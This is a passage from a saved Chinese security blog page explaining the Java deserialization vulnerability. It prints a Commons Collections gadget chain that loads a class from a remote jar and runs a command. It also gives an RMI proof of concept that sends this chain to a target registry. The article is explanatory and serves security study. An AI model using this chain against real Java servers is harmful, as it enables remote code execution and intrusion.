+new Object[] { new Object[] { new Java.net.URL[] { new Java.net.URL(url) }}}
+),
+new InvokerTransformer(
+"loadClass",
+new Class[] { String.class },
+new Object[] { "ErrorBaseExec" }
+),
+new InvokerTransformer(
+"getMethod",
+new Class[]{String.class, Class[].class},
+new Object[]{"do_exec", new Class[]{String.class}}
+),
+new InvokerTransformer(
+"invoke",
+new Class[]{Object.class, Object[].class},
+new Object[]{null, new String[]{cmd}}
+)
+}; </pre>
+<p>有了先前的理解，这个链就很明了了。先建立一个读取远程jar文件的类 URLClassLoader，实例化这个类，传入要访问的url，再读取远程加载类，接着获取类方法，然后反射这个方法。</p>
+<p><span style="color: #ff6600"><strong>关于RMI利用的相关内容</strong></span></p>
+<p>tang3已经在RMI利用文章讲过怎么利用了，这段内容，我只是详解下给出的poc的原理。</p>
+<p>poc部分内容</p>
+<p><!--StartFragment --></p>
+<div>
+<pre class="brush: python; title: ; notranslate" title="">&lt;/div&gt;
+Transformer transformedChain = new ChainedTransformer(transformers);
+Map BeforeTransformerMap = new HashMap();
+innerMap.put("value", "value");
+Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);
+
+Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+ctor.setAccessible(true);
+Object instance = ctor.newInstance(Target.class, AfterTransformerMap);
+
+InvocationHandler h = (InvocationHandler) instance;
+Remote r = Remote.class.cast(Proxy.newProxyInstance(
+Remote.class.getClassLoader(),
+new Class[]{Remote.class},
+h));
+try{
+Registry registry = LocateRegistry.getRegistry(ip, port);
+registry.rebind("", r); // r is remote obj
+}
+catch (Throwable e) {
+e.printStackTrace();
+}</pre>
+<p>RMI利用的poc看上去还是很熟悉的，因为到建立instance时，还和之前的内容一致。之后便到了RMI内容独有的细节，从代码角度可以看出利用逻辑为：</p>
+<p><span style="color: #ff6600"><strong>建立实例对象instance</strong></span></p>
+<p>实例对象instance 转化为 InvocationHandler类型的句柄h（因为instance是序列化后的内容，所以instance就是一串数据）</p>
+<p>把句柄h附载到Remote类实例 r上</p>
+<p>向远程服务器注册，得到远程注册对象 registry</p>
+<p>向远程注册对象registry注册 实例r</p>
+<p>在Java的RMI中，我们允许向远程已运行的jvm虚拟环境中绑定（rebind函数，也可以理解为添加）一些实例对象，通过RMI协议传输一些
+序列化好的内容，这样服务端解析（也就是反序列化）传过来的数据后，便可把解析后的内容添加到运行环境中。构造remote类型实例r 
+方法很多，poc中利用动态代理创建remote实例r是方法之一。</p>
+<p>因此涉及RMI的代码也会存在Java反序列化漏洞。</p>
+<p><strong><span style="color: #ff6600">漏洞影响分析</span></strong></p>
+<p>Java反序列化漏洞从爆出到现在快2个月了。最开始的只能命令执行和反弹shell，到后来的有回显的命令执行，到最终的代码执行，利用上来是越
+来越方便（有回显的命令执行和代码执行均为利用远程jar文件的利用形式）。从微博来看，已有白帽子实现了jenkins，weblogic，jboss
+等的代码执行利用工具。待最终利用工具公布，此漏洞还会有一个上升趋势的影响。</p>
+<p><strong><span style="color: #ff6600">资料引用</span></strong></p>
+<p>http://blog.chaitin.com/2015-11-11_java_unserialize_rce/</p>
+<p>http://security.tencent.com/index.php/blog/msg/97</p>
+</div>
+<p>http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</p>
+<p>http://www.infoq.com/cn/articles/cf-java-object-serialization-rmi</p>
+<p>http://blog.nsfocus.net/learning-guide-java-serialization-de-serialization-vulnerability-remediation/</p>
+<p>http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/</p>
+<p>【原文:<span style="color: #ff6600"><strong><a style="color: #ff6600" href="http://www.milw0rm.cn/articles/hole/20151226/2775.html" target="_blank">Java反序列化漏洞详解</a></strong></span> &nbsp;安全脉搏<span style="color: #ff6600"><strong>Blackhold</strong></span>整理发布】</p>
+</div>
+</div>
+</div>
+</div>
+		<div class="pageShenming">
+【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
+<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/java" rel="tag">java</a><a href="https://www.secpulse.com/archives/tag/%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e" rel="tag">反序列化漏洞</a><a href="https://www.secpulse.com/archives/tag/%e6%bc%8f%e6%b4%9e" rel="tag">漏洞</a></div>
+		</div>
+	<!-- .single-content -->
+		<div class="pageActive">
+	<div class="mark-like-btn">
+			<a id="wp-zan-42126" class="wp-zan share-btn" onclick="wpzan(42126, 0)" href="javascript:;"><i class="fa fa-heart fa-2"></i><span>1</span>个人喜欢</a>				</div>
+	<!-- Baidu Button BEGIN -->
+	<div class="bdshare">
+		<div class="bdsharebuttonbox">
+			<a href="#" class="bds_more" data-cmd="more"></a><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+		</div>
+		<script>
+		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
+		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+		</script>
+
+	</div>
+</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com/" target="_blank" title="安识科技 专业安全服务商"><img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/secweixin.png" style="width:785px;height:315px"></a><center></center></center></div>
+		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>
+
+	<ul class="related_post">
+				<li><a href="https://www.secpulse.com/archives/58077.html" title="详细阅读 勒索病毒WannaCry深度技术分析——详解传播、感染和危害细节">
+		 <img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/timthumb_003.jpg" alt="勒索病毒WannaCry深度技术分析——详解传播、感染和危害细节" class="xg-img">
+		<p>勒索病毒WannaCry深度技术分析——…</p></a></li>
+				<li><a href="https://www.secpulse.com/archives/54652.html" title="详细阅读 谈一谈java代码审计—安全小课堂第四十一期">
+		 <img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/timthumb.jpg" alt="谈一谈java代码审计—安全小课堂第四十一期" class="xg-img">
+		<p>谈一谈java代码审计—安全小课堂第四十…</p></a></li>
+				<li><a href="https://www.secpulse.com/archives/53852.html" title="详细阅读 某云pc客户端命令执行挖掘过程">
+		 <img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/timthumb_002.jpg" alt="某云pc客户端命令执行挖掘过程" class="xg-img">
+		<p>某云pc客户端命令执行挖掘过程</p></a></li>
+			</ul>
+
+
+</section></article>
+
+
+<!-- 引用 -->
+<div id="comments" class="comments-area">
+	<h2 class="comments-title">
+		抢沙发
+	</h2>
+			<div id="respond" class="comment-respond row">
+		
+
+
+			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
+		
+				
+						
+			<div id="comboxinfo">
+					<div class="cominfodiv cominfodiv-author ">
+					<p for="author" class="nicheng">
+     <input name="author" id="author" class="texty" tabindex="1" type="text"> <span class="required">昵称*</span>
+      </p>
+</div>
+					<div class="cominfodiv cominfodiv-email">
+					<p for="email">	<input name="email" id="email" class="texty" tabindex="2" type="text"> <span class="required">邮箱*</span>
+						</p>
+					</div>
+					<div class="cominfodiv cominfodiv-url">
+					 	<p for="url"><input name="url" id="url" class="texty" tabindex="3" type="text"><span>网址 </span>
+						</p>
+					</div>
+					
+			
+				
+</div>		       <div class=" cominfodiv-nr">  
+<textarea class="texty" name="w" id="comment" rows="10" tabindex="4" placeholder="输入评论内容..."></textarea><div id="loading" style="display: none;"> 正在提交, 请稍候...</div><div id="error" style="display: none;">#</div><textarea name="comment" cols="100%" rows="4" style="display:none"></textarea>
+							<div class="submitcom">
+							
+					<input id="submit" name="submit" tabindex="5" value="提&nbsp;交" type="submit">
+					<input name="comment_post_ID" value="42126" id="comment_post_ID" type="hidden">
+<input name="comment_parent" id="comment_parent" value="0" type="hidden">
+<p style="display: none;"><input id="akismet_comment_nonce" name="akismet_comment_nonce" value="07a5f9c512" type="hidden"></p><p style="display: none;"></p>				</div>
+				<div id="cancel_comment_reply"><a rel="nofollow" id="cancel-comment-reply-link" href="https://www.secpulse.com/archives/42126.html#respond" style="display:none;">取消回复</a></div>
+			
+</div>
+			
+				
+			<input id="ak_js" name="ak_js" value="1500728447346" type="hidden"></form>
+			
+			
+			<script type="text/javascript">
+				document.getElementById("comment").onkeydown = function (moz_ev){
+				var ev = null;
+				if (window.event){
+				ev = window.event;
+				}else{
+				ev = moz_ev;
+				}
+				if (ev != null && ev.ctrlKey && ev.keyCode == 13){
+				document.getElementById("submit").click();}
+				}
+			</script></div>
+	 		
+</div>
+<!-- #comments --></div>
+		
+<div class="xs-right sidebar xs-hidden xss-hidden">
+	<div class="authorbox">
+	<div class="author-top">
+<div id="author-img">
+<img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/tf-150x150.jpg" alt="blackhold" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 alignnone photo" width="96" height="96">
+</div>
+<div class="au-name">
+<a href="https://www.secpulse.com/archives/author/blackhold" title="由blackhold发布" rel="author">blackhold</a><br>
+ <span class="au-title">总共19篇文章</span>
+</div> </div>
+	<div class="author-word"><span class="quotes q1"></span>
+网络攻防小组http://www.milw0rm.cn/	<span class="quotes q2"></span></div>
+	</div>
+	
+				<aside id="recent-posts-2" class="widget-container widget_recent_entries">		<div class="si-title"><h2>最新脉搏</h2></div>		<ul>
+					<li>
+				<a href="https://www.secpulse.com/archives/59429.html">活动——【滴滴安全说】第5期 欺骗的艺术之 蜜罐技术专场</a>
+						</li>
+					<li>
+				<a href="https://www.secpulse.com/archives/59375.html">服务器运维丨谁动了我的主机之History命令</a>
+						</li>
+					<li>
+				<a href="https://www.secpulse.com/archives/59362.html">美团金融招聘高级安全人才（北京、上海)</a>
+						</li>
+					<li>
+				<a href="https://www.secpulse.com/archives/59333.html">河北龙瀚高薪引进 安全技术总监、高级安全工程师等人才</a>
+						</li>
+					<li>
+				<a href="https://www.secpulse.com/archives/59165.html">文档型漏洞攻击研究报告</a>
+						</li>
+				</ul>
+		</aside><aside id="hot_comment-3" class="widget-container widget_hot_comment"><div class="si-title"><h2>脉搏热评</h2></div>
+	<ul class="hot_comment_widget">
+		
+<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/59065.html" rel="bookmark" title="web安全之如何全面发现系统后台 (6条评论)">web安全之如何全面发现系统后台</a></li>
+<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/58537.html" rel="bookmark" title="SecPulse“脉搏涌动”第二届安全技术交流沙龙 (3条评论)">SecPulse“脉搏涌动”第二届安全技…</a></li>
+<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/57712.html" rel="bookmark" title="安识科技2017年度诚聘英才 (2条评论)">安识科技2017年度诚聘英才</a></li>
+<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/57919.html" rel="bookmark" title="白帽时鉴期刊第一期 (2条评论)">白帽时鉴期刊第一期</a></li>
+<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/59262.html" rel="bookmark" title="跟着DVWA学Web安全开发 (2条评论)">跟着DVWA学Web安全开发</a></li>			</ul>
+
+</aside><aside id="random_post-2" class="widget-container widget_random_post"><div class="si-title"><h2>随机脉搏</h2></div>
+
+	<ul class="random_post">
+		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/38796.html" rel="bookmark" title="详细阅读 千里马人才网某漏洞导致可泄露百万人才库&amp;SQL注射">千里马人才网某漏洞导致可泄露百万人才库&amp;SQL注射</a></li>
+		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/28402.html" rel="bookmark" title="详细阅读 搜狐畅游某TestLink平台信息泄漏">搜狐畅游某TestLink平台信息泄漏</a></li>
+		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/40889.html" rel="bookmark" title="详细阅读 保险安全之新华保险理赔之窗某处存SQL注射漏洞（可导致大量用户信息泄漏，疑似为员工信息）">保险安全之新华保险理赔之窗某处存SQL注射漏洞（可导致大量用户信息泄漏，疑似为员工信息）</a></li>
+		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/43132.html" rel="bookmark" title="详细阅读 厦门大学内网漫游">厦门大学内网漫游</a></li>
+		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/46837.html" rel="bookmark" title="详细阅读 南方航空某站存在SQL注入漏洞">南方航空某站存在SQL注入漏洞</a></li>
+					</ul>
+
+
+</aside><aside id="text-11" class="widget-container widget_text"><div class="si-title"><h2>脉搏官方微信公众号</h2></div>			<div class="textwidget"><img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/SecPulse.png" width="280px" height="364px"></div>
+		</aside>				</div>
+	</div>
+
+	</section>
+
+  <div class="inner row visible-lg-block">
+
+	<div class="friends">
+		<h3>友情链接</h3>
+		<ul>
+			<li><a href="https://xianzhi.aliyun.com/forum/?secpulse" target="_blank">先知安全社区</a><span>|</span></li>
+			<li><a href="https://threathunter.org/" target="_blank">ThreatHunter社区</a><span>|</span></li>
+			<li><a href="http://www.ijiandao.com/" target="_blank">网络尖刀</a><span>|</span></li>
+			<li><a href="http://navisec.it/" target="_blank">NaviSec导航</a><span>|</span></li>
+		    <li><a href="https://www.easyaq.com/" target="_blank">E安全</a><span>|</span></li>
+			<li><a href="http://www.sec-wiki.com/" target="_blank">Sec-Wiki</a><span>|</span></li>
+			<li><a href="http://www.waitalone.cn/" target="_blank">独自等待</a><span>|</span></li>
+			<li><a href="http://www.shellsec.com/" target="_blank">神刀网</a><span>|</span></li>
+			<li><a href="http://www.ineice.com/" target="_blank">爱内测</a><span>|</span></li>
+			<li><a href="http://www.itet.cn/" target="_blank">北京ITET培训中心</a><span>|</span></li>
+			<li><a href="http://www.ihonker.org/" target="_blank">中国红客联盟</a><span>|</span></li>
+			<li><a href="http://www.bigniu.com/" target="_blank">比戈大牛</a><span>|</span></li>
+			<li><a href="http://www.tiejiang.org/" target="_blank">铁匠运维网</a><span>|</span></li>
+			<li><a href="http://www.nagain.com/" target="_blank">娜迦信息</a><span>|</span></li>
+			<li><a href="https://www.secsilo.com/" target="_blank">SecSilo</a><span>|</span></li>
+			<li><a href="https://team.armyzer0.com/" target="_blank">armyzer0</a><span>|</span></li>
+			<li><a href="http://www.nosafe.org/" target="_blank">NoSafe</a></li>
+		</ul>
+	</div>
+
+	<div class="friends">
+		<h3>合作伙伴</h3>
+		<ul>
+			<a href="https://www.duoyinsu.com/" class="external" target="_blank">
+				<img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/anshi-logo.png" alt="安识科技" width="150px" height="45px">
+			</a>
+			<a href="http://aq.163.com/module/partner.html" class="external" target="_blank"> <img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/netease.jpg" alt="网易安全中心" width="150px" height="45px">
+			</a>
+			<a href="https://security.alibaba.com/" class="external" target="_blank"> <img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/asrc.jpg" alt="阿里安全中心" width="150px" height="45px">
+			</a>
+			
+			<a href="http://yaq.qq.com/" class="external" target="_blank"> <img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/yaqnew.png" alt="腾讯御安全" width="140px" height="45px">
+			</a>
+			
+			<a href="http://www.4hou.com/" class="external" target="_blank"> <img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/4hou.png" alt="嘶吼RoarTalk" width="150px" height="45px">
+			</a>
+			
+			<a href="http://www.ichunqiu.com/?from=secpulse" class="external" target="_blank"> <img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/ichunqiu.png" alt="i春秋学院" width="140px" height="45px">
+			</a>
+
+			<a href="#" class="external" target="_blank"> <img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/bigsec.png" alt="bigsec岂安科技" width="140px" height="45px">
+			</a>
+		
+			<a href="http://www.milw0rm.cn/" class="external" target="_blank"> <img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/milw0rm.png" alt="Milw0rm Team" width="120px" height="40px">
+			</a>
+
+
+			<a href="#" class="external" target="_blank"> <img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/cloversec.png" alt="四叶草安全" width="130px" height="45px">
+			</a>
+			<a href="https://www.aqdog.com/" class="external" target="_blank"> <img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/aqdog.png" alt="安犬云平台" width="140px" height="45px">
+			</a>
+			
+			<a href="http://www.e365.org/" class="external" target="_blank"> <img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/e365.png" alt="易安在线" width="130px" height="45px">
+			</a>
+			
+			
+			
+
+		</ul>
+	</div>
+</div>
+<footer class="footer clr" id="footer">
+	<div class="inner inner-footer">
+		<div class="footer-secpulse">
+			<h3>SecPulse</h3>
+			<ul>
+				<li><a href="https://www.secpulse.com/about">关于SecPulse</a></li>
+				<!--<li><a href="http://test.secpulse.com">SecPulse专测</a> <sup>NEW!</sup></li>-->
+				<li><a href="https://www.secpulse.com/hire">加入我们</a></li>
+				<li><a href="https://www.secpulse.com/report">寻求报道</a></li>
+				<li><a href="https://www.secpulse.com/contact-us">联系我们</a></li>
+			</ul>
+		</div>
+		<div class="footer-subscribe xs-hidden">
+			<h3>订阅</h3>
+			<ul>
+				<li><a href="https://www.secpulse.com/feed">RSS订阅</a></li>
+				<li><a href="https://www.secpulse.com/feed">邮箱订阅</a></li>
+				<li><a href="https://www.secpulse.com/feed">线下活动订阅</a></li>
+				<li></li>
+				<li><a href="http://weibo.com/311057789">官方微博</a></li>
+				<!-- <li><a href="https://twitter.com/secpulse">Twitter</a></li> -->
+			</ul>
+		</div>
+		<div class="footer-partner">
+			<h3>全力驱动</h3>
+			<ul class="cf">
+				<li><a href="https://www.secpulse.com/" class="external" target="_blank"><img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/seclogo.png" alt="安全脉搏" width="200px"></a></li>
+			</ul>
+		</div>
+		<div class="footer-copyright xs-hidden">
+			<p>本站由SecPulse安全脉搏团队全力维护。</p>
+			<p>
+				Powered By <a title="安全脉搏" href="https://www.secpulse.com/">SecPulse</a>
+			</p>
+			<p>©2013-2017 安全脉搏</p>
+			<p>沪ICP备16016474号</p>
+			<img src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/qrcode.jpg" alt="Qrcode" width="150px" height="150px">
+
+		</div>
+	</div>
+</footer>
+<div id="shangxia">
+	<div id="shang" title="↑ 返回顶部"></div>
+              <div id="comt" title="查看评论"></div>
+              <div id="xia" title="↓ 移至底部"></div>
+</div>
+<script type="text/javascript" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/form.js"></script>
+<script type="text/javascript" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/shCore.js"></script>
+<script type="text/javascript" src="Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%20-%20SecPulse.COM%20_%20%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F_files/shBrushPython.js"></script>
+<script type="text/javascript">
+	(function(){
+		var corecss = document.createElement('link');
+		var themecss = document.createElement('link');
+		var corecssurl = 
+"https://www.secpulse.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
+
+		if ( corecss.setAttribute ) {
+				corecss.setAttribute( "rel", "stylesheet" );
+				corecss.setAttribute( "type", "text/css" );
+				corecss.setAttribute( "href", corecssurl );
+		} else {
+				corecss.rel = "stylesheet";
+				corecss.href = corecssurl;
+		}
+		document.getElementsByTagName("head")[0].insertBefore( corecss, 
+document.getElementById("syntaxhighlighteranchor") );
+		var themecssurl = 
+"https://www.secpulse.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeEmacs.css?ver=3.0.9b";
+
+		if ( themecss.setAttribute ) {
+				themecss.setAttribute( "rel", "stylesheet" );
+				themecss.setAttribute( "type", "text/css" );
+				themecss.setAttribute( "href", themecssurl );
+		} else {
+				themecss.rel = "stylesheet";
+				themecss.href = themecssurl;
+		}
+		
+//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
+
+		document.getElementsByTagName("head")[0].insertBefore( themecss, 
+document.getElementById("syntaxhighlighteranchor") );
+	})();
+	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
+	SyntaxHighlighter.config.strings.help = '帮助';
+	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
+	SyntaxHighlighter.config.strings.noBrush = '无法找到Brush：';
+	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush不能设置 
+html-script选项';
+	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
+	SyntaxHighlighter.defaults['toolbar'] = false;
+	SyntaxHighlighter.all();
+</script>
+
+
+
+</body></html>
